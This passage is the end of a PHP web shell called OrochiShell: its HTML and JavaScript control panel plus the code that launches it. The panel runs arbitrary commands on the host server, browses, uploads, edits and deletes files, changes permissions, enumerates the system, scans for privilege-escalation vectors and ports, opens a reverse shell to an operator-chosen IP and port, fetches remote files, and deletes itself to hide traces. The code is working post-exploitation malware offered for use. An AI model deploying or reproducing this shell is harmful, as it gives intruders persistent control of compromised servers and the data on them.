flex-grow-1"></div></div></div></div><div class="card"><div class="card-header d-flex justify-content-between align-items-center flex-wrap"><div id="clickable-path-container" class="py-1 small"></div><div id="loading-spinner" class="spinner-border spinner-border-sm text-primary" role="status" style="display:none"></div></div><div class="card-body p-0"><div class="table-responsive"><table class="table table-hover m-0"><thead class="table-dark"><tr><th>Name</th><th>Size</th><th>Perms</th><th>Owner</th><th>Modified</th><th class="text-end">Actions</th></tr></thead><tbody id="file-list"></tbody></table></div></div></div></div>
<div class="modal fade" id="tools-modal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" style="font-family:'Orbitron'"><i class="fa-solid fa-toolbox me-2"></i>Advanced Tools</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><nav><div class="nav nav-tabs mb-3" role="tablist"><button class="nav-link active" data-bs-toggle="tab" data-bs-target="#nav-enum" type="button">System Enum</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-privesc" type="button">PrivEsc</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-network" type="button">Network</button><button class="nav-link" data-bs-toggle="tab" data-bs-target="#nav-danger" type="button">Danger Zone</button></div></nav><div class="tab-content"><div class="tab-pane fade show active" id="nav-enum"><button id="btn-run-enum" class="btn btn-outline-primary mb-3">Run Full Enumeration</button><div id="enum-results" class="accordion"></div></div><div class="tab-pane fade" id="nav-privesc"><button id="btn-run-privesc" class="btn btn-outline-primary mb-3">Scan for PrivEsc Vectors</button><div id="privesc-results" class="accordion"></div></div><div class="tab-pane fade" id="nav-network"><div class="row"><div class="col-md-6 mb-3"><h6><i class="fa-solid fa-satellite-dish me-2"></i>Port Scanner</h6><div class="input-group"><input type="text" id="scan-host" class="form-control" placeholder="Target Host/IP" value="127.0.0.1"><input type="text" id="scan-ports" class="form-control" placeholder="e.g. 22,80,443,100-200"><button id="btn-run-scan" class="btn btn-outline-primary">Scan</button></div><pre id="scan-results" class="p-2 rounded mt-2" style="height:auto;min-height:150px;"></pre></div><div class="col-md-6 mb-3"><h6><i class="fa-solid fa-person-military-pointing me-2"></i>Reverse Shell</h6><div class="input-group"><input type="text" id="rev-ip" class="form-control" placeholder="Your IP"><input type="number" id="rev-port" class="form-control" placeholder="Port"><button id="btn-run-revshell" class="btn btn-outline-primary">Connect</button></div><pre id="revshell-log" class="p-2 rounded mt-2" style="height:auto;min-height:150px;"></pre></div></div><div class="mt-3"><h6><i class="fa-solid fa-cloud-arrow-down me-2"></i>Remote Downloader</h6><div class="input-group"><input type="url" id="remote-url-input" class="form-control" placeholder="https://example.com/file.zip"><button id="btn-remote-download" class="btn btn-outline-primary">Fetch</button></div></div></div><div class="tab-pane fade" id="nav-danger"><div class="text-center p-4 border border-danger rounded"><h5 class="text-danger"><i class="fa-solid fa-biohazard me-2"></i>Self Destruct</h5><p class="small text-muted">This will permanently delete the shell script from the server. This action is irreversible.</p><button id="btn-self-destruct" class="btn btn-danger w-50">Destroy Script</button></div></div></div></div></div></div></div>
<div class="modal fade" id="editor-modal" tabindex="-1"><div class="modal-dialog modal-xl"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="editor-title"></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><textarea id="editor" class="form-control bg-dark" style="height:70vh;font-family:monospace;"></textarea></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button><button type="button" class="btn btn-primary" id="save-file-btn">Save</button></div></div></div></div>
<div class="modal fade" id="confirm-modal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="confirm-title"></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><p id="confirm-body"></p></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn btn-danger" id="confirm-btn">Confirm</button></div></div></div></div>
<div class="modal fade" id="upload-modal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title">Upload Files</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="upload-form"><div class="mb-3"><label for="file-input" class="form-label">Select files for <strong id="upload-path"></strong></label><input class="form-control" type="file" id="file-input" multiple></div></form></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button><button type="button" class="btn btn-primary" id="upload-btn">Upload</button></div></div></div></div>
<div class="modal fade" id="create-modal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title">Create New</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="create-form" onsubmit="event.preventDefault(); document.getElementById('create-confirm-btn').click();"><div class="input-group mb-3"><select class="form-select" id="create-type"><option value="file" selected>File</option><option value="folder">Folder</option></select><input type="text" id="create-name" class="form-control" placeholder="Enter name..." required></div></form></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn btn-primary" id="create-confirm-btn">Create</button></div></div></div></div>
<div class="modal fade" id="rename-modal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="rename-title"></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><form id="rename-form" onsubmit="event.preventDefault(); document.getElementById('rename-confirm-btn').click();"><input type="text" id="rename-name" class="form-control" required></form></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn btn-primary" id="rename-confirm-btn">Rename</button></div></div></div></div>
<div class="modal fade" id="chmod-modal" tabindex="-1"><div class="modal-dialog"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="chmod-title"></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><p>Enter new permissions for <strong id="chmod-item-name"></strong> in octal format (e.g., 0755).</p><form id="chmod-form" onsubmit="event.preventDefault(); document.getElementById('chmod-confirm-btn').click();"><input type="text" id="chmod-perms" class="form-control" pattern="[0-7]{3,4}" required></form></div><div class="modal-footer"><button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button><button type="button" class="btn btn-primary" id="chmod-confirm-btn">Change</button></div></div></div></div>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script><script>
document.addEventListener('DOMContentLoaded', () => {
    const App = {
        state: { currentPath: '/', user: '...', hostname: '...', csrfToken: null, currentItem: { path: null, name: null, perms: null } },
        modals: {},
        init() {
            if (!document.body.classList.contains('bg-dark')) return;
            this.modals = { editor: new bootstrap.Modal('#editor-modal'), confirm: new bootstrap.Modal('#confirm-modal'), upload: new bootstrap.Modal('#upload-modal'), create: new bootstrap.Modal('#create-modal'), rename: new bootstrap.Modal('#rename-modal'), tools: new bootstrap.Modal('#tools-modal'), chmod: new bootstrap.Modal('#chmod-modal'), };
            this.addEventListeners();
            this.initializeContext();
        },
        async apiCall(action, data = {}, isFormData = false) {
            this.showLoading(true);
            const formData = isFormData ? data : new FormData();
            if (this.state.csrfToken) formData.append('csrf_token', this.state.csrfToken);
            if (!isFormData) {
                formData.append('action', action);
                for (const key in data) formData.append(`data[${key}]`, data[key]);
            } else { if(!formData.has('action')) formData.append('action', action); }
            if(!formData.has('data[path]')) formData.append('data[path]', this.state.currentPath);

            try {
                const response = await fetch(window.location.href, { method: 'POST', body: formData });
                if (action === 'downloadFile') {
                     if (!response.ok) throw new Error(`Download failed: ${response.statusText}`);
                     const blob = await response.blob(); const url = window.URL.createObjectURL(blob); const a = document.createElement('a');
                     a.style.display = 'none'; a.href = url; a.download = data.filename;
                     document.body.appendChild(a); a.click(); window.URL.revokeObjectURL(url); a.remove();
                     return {success: true};
                }
                const resultText = await response.text();
                if (!resultText.startsWith('{')) throw new Error("Server returned a non-JSON response, indicating a fatal PHP error.");
                const result = JSON.parse(resultText);
                if (!result.success) throw new Error(result.message || 'An unknown error occurred.');
                if (result.message) this.showToast(result.message, 'success');
                return result;
            } catch (error) {
                this.showToast(error.message, 'danger'); console.error("API Call Error:", error);
                return null;
            } finally {
                this.showLoading(false);
            }
        },
        showLoading(isLoading) { document.getElementById('loading-spinner').style.display = isLoading ? 'inline-block' : 'none'; },
        showToast(message, type = 'success') {
            const container = document.getElementById('toast-container'); const toastId = 'toast-' + Date.now();
            const iconClass = type === 'success' ? 'fa-check-circle text-success' : 'fa-triangle-exclamation text-danger';
            container.insertAdjacentHTML('beforeend', `<div id="${toastId}" class="toast" role="alert"><div class="toast-header"><i class="fa-solid ${iconClass} me-2"></i><strong class="me-auto">${type.charAt(0).toUpperCase() + type.slice(1)}</strong><button type="button" class="btn-close" data-bs-dismiss="toast"></button></div><div class="toast-body">${message}</div></div>`);
            const toast = new bootstrap.Toast(document.getElementById(toastId), { delay: 5000 });
            toast.show(); document.getElementById(toastId).addEventListener('hidden.bs.toast', e => e.target.remove());
        },
        async initializeContext() {
            const result = await this.apiCall('getContext');
            if (result && result.success) {
                const { user, hostname, systemInfo, initialPath, csrfToken } = result.data;
                this.state.user = user; this.state.hostname = hostname; this.state.csrfToken = csrfToken;
                let html = '<dl class="row g-2">';
                for (const [key, value] of Object.entries(systemInfo)) {
                    html += `<dt class="col-sm-4 text-primary text-truncate">${key}</dt><dd class="col-sm-8 text-muted small" style="white-space: pre-wrap; word-break: break-all;">${value}</dd>`;
                }
                document.getElementById('system-info-body').innerHTML = html + '</dl>';
                await this.loadDirectory(initialPath);
            } else {
                 document.body.innerHTML = `<div class="vh-100 d-flex justify-content-center align-items-center bg-dark text-danger"><h1>Initialization Failed. Check console for details.</h1></div>`;
            }
        },
        async loadDirectory(path) {
            this.state.currentPath = path;
            const result = await this.apiCall('listDirectory', { path });
            if (!result) return;
            this.updateTerminalPrompt();
            document.getElementById('clickable-path-container').innerHTML = result.clickablePath;
            const fileListBody = document.getElementById('file-list');
            fileListBody.innerHTML = '';
            const items = [...result.folders, ...result.files];
            if (items.length === 0) {
                fileListBody.innerHTML = '<tr><td colspan="6" class="text-center text-muted">Directory is empty</td></tr>';
                return;
            }
            items.forEach(item => {
                const row = document.createElement('tr');
                row.dataset.path = item.path; row.dataset.name = item.name; row.dataset.perms = item.perms_octal;
                const actions = `<i title="Chmod" class="fa-solid fa-key action-icon p-2" data-action="chmod"></i> ${item.type === 'file' ? `<i title="Download" class="fa-solid fa-download action-icon p-2" data-action="download"></i><i title="Edit" class="fa-solid fa-file-pen action-icon p-2" data-action="edit"></i>` : ''}<i title="Rename" class="fa-solid fa-pen-to-square action-icon p-2" data-action="rename"></i><i title="Delete" class="fa-solid fa-trash action-icon p-2" data-action="delete"></i>`;
                const linkName = item.name === '..' ? '<i class="fa-solid fa-arrow-turn-up me-2"></i> Parent Directory' : item.name;
                row.innerHTML = `<td><i class="${item.icon} me-2" style="color:${item.type==='folder' ? 'var(--theme-accent)' : 'var(--bs-body-color)'};"></i>${item.type==='folder' ? `<a href="#" class="path-part" data-path="${item.path}">${linkName}</a>` : item.name}</td><td>${item.size}</td><td><samp>${item.perms_human}</samp></td><td>${item.owner}</td><td>${item.modified}</td><td class="text-end p-1">${actions}</td>`;
                fileListBody.appendChild(row);
            });
        },
        updateTerminalPrompt() {
            const prompt = document.getElementById('terminal-prompt');
            if(prompt) prompt.innerHTML = `<span style="color:var(--theme-accent);">${this.state.user}@${this.state.hostname}</span><span class="text-white">:</span><span style="color:var(--theme-primary);">${this.state.currentPath}</span><span class="text-white">$</span>`;
        },
        addEventListeners() {
            document.body.addEventListener('click', e => {
                const actionTarget = e.target.closest('[data-action]');
                const pathTarget = e.target.closest('a.path-part');
                if (actionTarget) this.handleItemAction(e, actionTarget);
                if (pathTarget) { e.preventDefault(); this.loadDirectory(pathTarget.dataset.path); }
            });
            document.getElementById('cmd-form').addEventListener('submit', this.handleCommandExecution.bind(this));
            document.getElementById('btn-tools').onclick = () => this.modals.tools.show();
            document.getElementById('btn-upload').onclick = () => { this.modals.upload.show(); document.getElementById('upload-path').innerText = this.state.currentPath; };
            document.getElementById('btn-create').onclick = () => this.modals.create.show();
            document.getElementById('save-file-btn').onclick = this.handleSaveFile.bind(this);
            document.getElementById('rename-confirm-btn').onclick = this.handleRenameItem.bind(this);
            document.getElementById('chmod-confirm-btn').onclick = this.handleChmodItem.bind(this);
            document.getElementById('upload-btn').onclick = this.handleUploadFiles.bind(this);
            document.getElementById('create-confirm-btn').onclick = this.handleCreateItem.bind(this);
            document.getElementById('btn-run-enum').onclick = this.handleRunTool.bind(this, 'getSystemEnum', 'enum-results');
            document.getElementById('btn-run-privesc').onclick = this.handleRunTool.bind(this, 'getPrivescInfo', 'privesc-results');
            document.getElementById('btn-run-scan').onclick = this.handlePortScan.bind(this);
            document.getElementById('btn-run-revshell').onclick = this.handleReverseShell.bind(this);
            document.getElementById('btn-remote-download').onclick = this.handleRemoteDownload.bind(this);
            document.getElementById('btn-self-destruct').onclick = this.handleSelfDestruct.bind(this);
        },
        async handleItemAction(e, target) {
            e.preventDefault();
            const action = target.dataset.action;
            const row = target.closest('tr');
            this.state.currentItem = { path: row.dataset.path, name: row.dataset.name, perms: row.dataset.perms };
            switch(action) {
                case 'edit': const fileData = await this.apiCall('getFileContent', { item: this.state.currentItem.path }); if (fileData) { document.getElementById('editor-title').innerText = `Editing: ${this.state.currentItem.name}`; document.getElementById('editor').value = fileData.content; this.modals.editor.show(); } break;
                case 'rename': document.getElementById('rename-title').innerText = `Rename: ${this.state.currentItem.name}`; document.getElementById('rename-name').value = this.state.currentItem.name; this.modals.rename.show(); break;
                case 'delete': this.showConfirmModal('Delete Item', `Permanently delete <strong>${this.state.currentItem.name}</strong>?`, async () => { if (await this.apiCall('deleteItem', { item: this.state.currentItem.path })) await this.loadDirectory(this.state.currentPath); }); break;
                case 'download': await this.apiCall('downloadFile', { item: this.state.currentItem.path, filename: this.state.currentItem.name }); break;
                case 'chmod': document.getElementById('chmod-title').innerText = `Change Permissions`; document.getElementById('chmod-item-name').innerText = this.state.currentItem.name; document.getElementById('chmod-perms').value = this.state.currentItem.perms; this.modals.chmod.show(); break;
            }
        },
        async handleCommandExecution(e) {
            e.preventDefault(); const input = document.getElementById('cmd-input'); const command = input.value.trim();
            if (!command) return;
            const terminalOutput = document.getElementById('terminal-output');
            terminalOutput.innerHTML += `\n<span class="text-primary">${document.getElementById('terminal-prompt').innerHTML}</span> ${command}\n`;
            const result = await this.apiCall('executeCommand', { command });
            if (result) { terminalOutput.innerHTML += result.output; terminalOutput.scrollTop = terminalOutput.scrollHeight; input.value = ''; }
        },
        async handleSaveFile() { if (await this.apiCall('saveFileContent', { item: this.state.currentItem.path, content: document.getElementById('editor').value })) { this.modals.editor.hide(); } },
        async handleRenameItem() {
            const newName = document.getElementById('rename-name').value.trim();
            if (!newName || newName === this.state.currentItem.name) return;
            if (await this.apiCall('renameItem', { oldName: this.state.currentItem.path, newName })) { this.modals.rename.hide(); await this.loadDirectory(this.state.currentPath); }
        },
        async handleChmodItem() {
            const perms = document.getElementById('chmod-perms').value.trim();
            if (!perms.match(/[0-7]{3,4}/)) return this.showToast('Invalid permission format.', 'danger');
            if (await this.apiCall('chmodItem', { item: this.state.currentItem.path, perms })) { this.modals.chmod.hide(); await this.loadDirectory(this.state.currentPath); }
        },
        async handleUploadFiles() {
            const fileInput = document.getElementById('file-input');
            if (fileInput.files.length === 0) return this.showToast('Please select files.', 'danger');
            const formData = new FormData(); formData.append('action', 'uploadFiles');
            for (const file of fileInput.files) formData.append('fileToUpload[]', file);
            if (await this.apiCall('uploadFiles', formData, true)) { this.modals.upload.hide(); fileInput.form.reset(); await this.loadDirectory(this.state.currentPath); }
        },
        async handleCreateItem() {
            const name = document.getElementById('create-name').value.trim();
            if (!name) return this.showToast('Please enter a name.', 'danger');
            const type = document.getElementById('create-type').value;
            if (await this.apiCall('createItem', { name, type })) { this.modals.create.hide(); document.getElementById('create-form').reset(); await this.loadDirectory(this.state.currentPath); }
        },
        async handleRunTool(apiAction, resultsContainerId, e) {
            const btn = e.target; const originalText = btn.innerHTML;
            btn.disabled = true; btn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Working...';
            const result = await this.apiCall(apiAction);
            const container = document.getElementById(resultsContainerId); container.innerHTML = '';
            if (result) {
                const uniqueId = resultsContainerId;
                Object.entries(result.data).forEach(([title, content], index) => {
                    const cleanTitle = title.replace(/\W/g, ''); const collapseId = `collapse-${uniqueId}-${index}`;
                    container.innerHTML += `<div class="accordion-item"><h2 class="accordion-header"><button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#${collapseId}">${title}</button></h2><div id="${collapseId}" class="accordion-collapse collapse" data-bs-parent="#${resultsContainerId}"><div class="accordion-body"><pre>${content || 'No output.'}</pre></div></div></div>`;
                });
            }
            btn.disabled = false; btn.innerHTML = originalText;
        },
        async handlePortScan() {
            const host = document.getElementById('scan-host').value.trim(); const ports = document.getElementById('scan-ports').value.trim();
            if (!host || !ports) return this.showToast('Host and ports are required.', 'danger');
            const resultsEl = document.getElementById('scan-results'); resultsEl.textContent = 'Scanning...';
            const result = await this.apiCall('networkScan', { host, ports });
            if (result) {
                let output = '';
                for (const [port, status] of Object.entries(result.data)) output += `Port ${port}: ${status === 'Open' ? '<span class="text-success">Open</span>' : '<span class="text-danger">Closed</span>'}\n`;
                resultsEl.innerHTML = output;
            }
        },
        async handleReverseShell() {
            const ip = document.getElementById('rev-ip').value.trim(); const port = document.getElementById('rev-port').value.trim();
            if (!ip || !port) return this.showToast('IP and port are required.', 'danger');
            const logEl = document.getElementById('revshell-log'); logEl.textContent = 'Attempting connection...';
            const result = await this.apiCall('reverseShell', { ip, port });
            if (result) logEl.textContent = result.log.join('\n');
        },
        async handleRemoteDownload() {
            const url = document.getElementById('remote-url-input').value.trim();
            if (!url) return this.showToast('URL is required.', 'danger');
            if (await this.apiCall('remoteDownload', { url })) {
                document.getElementById('remote-url-input').value = '';
                await this.loadDirectory(this.state.currentPath);
            }
        },
        handleSelfDestruct() {
            this.showConfirmModal('Self Destruct', `Are you sure? This will <strong>permanently delete the shell script</strong>.`, async () => {
                const result = await this.apiCall('selfDestruct');
                if (result) document.body.innerHTML = `<div class="vh-100 d-flex justify-content-center align-items-center bg-dark text-light"><h1>${result.message}</h1></div>`;
            });
        },
        showConfirmModal(title, body, onConfirm) {
            document.getElementById('confirm-title').innerText = title; document.getElementById('confirm-body').innerHTML = body;
            const confirmBtn = document.getElementById('confirm-btn');
            const newConfirmBtn = confirmBtn.cloneNode(true);
            confirmBtn.parentNode.replaceChild(newConfirmBtn, confirmBtn);
            newConfirmBtn.addEventListener('click', () => { this.modals.confirm.hide(); onConfirm(); });
            this.modals.confirm.show();
        }
    };
    App.init();
});
</script></body></html>
OROCHI_HTML_LAYOUT;
    }
}

// Instantiate and run the application
try {
    $shell = new OrochiShell();
    $shell->run();
} catch (Throwable $e) {
    if (OROCHI_DEBUG) {
        echo "<h1>Fatal Error</h1><pre>";
        print_r($e);
        echo "</pre>";
    } else {
        http_response_code(500);
        echo "A fatal error occurred. Enable OROCHI_DEBUG for details.";
    }
}
